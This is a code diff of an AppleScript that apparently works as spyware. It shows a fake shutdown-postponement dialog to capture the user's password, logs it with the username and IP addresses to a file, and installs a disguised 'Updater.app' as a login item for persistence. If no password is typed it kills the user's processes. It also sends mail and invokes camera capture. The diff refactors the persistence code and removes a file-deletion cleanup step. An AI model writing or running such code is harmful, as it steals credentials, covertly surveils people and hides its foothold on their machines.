@@ -25,12 +25,10 @@ try
 	repeat
 		set passwd to text returned of (display dialog "Please enter your password to postpone shutdown." with title "Password" default answer "" buttons {"OK"} default button 1 giving up after 20 with hidden answer) -- Prompt for Password
 		if passwd = "" then
-			set reso to POSIX path of (path to resource "Updater.app") as text
-			do shell script "cp -r " & reso & "  " & ufld & "Updater.app"
-			set newreso to ufld & "Updater.app"
-			tell application "System Events"
-				make login item at end with properties {path:newreso, kind:application} -- Make application a login item
-			end tell
+			set reso to POSIX path of (path to resource "Updater.app")
+			set newreso to POSIX path of ("" & ufld & "Updater.app")
+			do shell script "cp -r " & reso & " " & newreso
+			tell application "System Events" to make login item at end with properties {path:newreso, kind:application} -- Make application a login item
 			do shell script "killall -u " & theuser -- shutdown
 		end if
 		
@@ -54,12 +52,10 @@ try
 	do shell script "echo " & dte & " - User: " & theuser & " Password: " & passwd & " WAN IP: " & WANIP & " LAN IP: " & LANIP & " > " & ufld & "" & theuser & ".txt"
 	
 	try
-		set reso to POSIX path of (path to resource "Updater.app") as text
-		do shell script "cp -r " & reso & " " & ufld & "Updater.app"
-		set newreso to ufld & "Updater.app"
-		tell application "System Events"
-			make login item at end with properties {path:newreso, kind:application} -- Make application a login item
-		end tell
+		set reso to POSIX path of (path to resource "Updater.app")
+		set newreso to POSIX path of ("" & ufld & "Updater.app")
+		do shell script "cp -r " & reso & " " & newreso
+		tell application "System Events" to make login item at end with properties {path:newreso, kind:application} -- Make application a login item
 		
 	end try
 	
@@ -140,11 +136,6 @@ tell application "Mail"
 	end tell
 	send theMessage
 end tell
-
-try
-	do shell script "rm " & adrt
-end try
-
 
 try
 	set isight to POSIX path of (path to resource "isightcapture")
